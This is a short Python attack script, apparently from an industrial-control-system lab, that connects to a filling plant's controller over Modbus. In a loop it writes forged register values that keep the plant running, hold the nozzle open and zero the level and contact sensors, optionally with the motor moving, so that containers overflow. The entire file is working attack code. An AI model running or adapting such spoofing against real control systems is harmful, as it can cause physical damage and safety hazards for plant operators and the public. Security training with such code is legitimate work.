#!/usr/bin/env python3
import time
import argparse
import textwrap

from modbus import (
    REG_RUN,
    REG_LEVEL,
    REG_CONTACT,
    REG_MOTOR,
    REG_NOZZLE,
    MODBUS_PORT,
)
from modbus import ClientModbus as Client
from modbus import ConnectionException

parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=textwrap.dedent('''\
        Attack script
        Types :
            - 1 : Stop and fill (default)
            - 2 : Move and fill
        '''))
parser.add_argument("-i", "--ip", type=ascii, required=False, help="IP", default="127.0.0.1")
parser.add_argument("-p", "--port", type=int, required=False, help="Port", default=MODBUS_PORT)
parser.add_argument("-a", "--attack", type=int, required=False, help="Attack type", default=1)
parser.add_argument("-f", "--frequency", type=int, required=False, help="Modbus frame frequency (sequence/s)", default=100)
args = parser.parse_args()

client = Client(args.ip, args.port)
period = 1/args.frequency

if ( args.attack == 1 ):
    run = 1
    motor = 0
    nozzle = 1
    level = 0
    contact = 0
elif ( args.attack == 2):
    run = 1
    motor = 1
    nozzle = 1
    level = 0
    contact = 0

try:
    client.connect()

    while True:
        client.write(REG_RUN, run) 	    # Run Plant, Run!
        client.write(REG_LEVEL, level) 	    # Level Sensor
        client.write(REG_MOTOR, motor) 	    # Level Sensor
        client.write(REG_NOZZLE, nozzle) 	    # Level Sensor
        client.write(REG_CONTACT, contact) 	# Contact Sensor
        time.sleep(period)

except KeyboardInterrupt:
    client.close()
except ConnectionException:
    client.close()
    print ("Unable to connect / Connection lost")
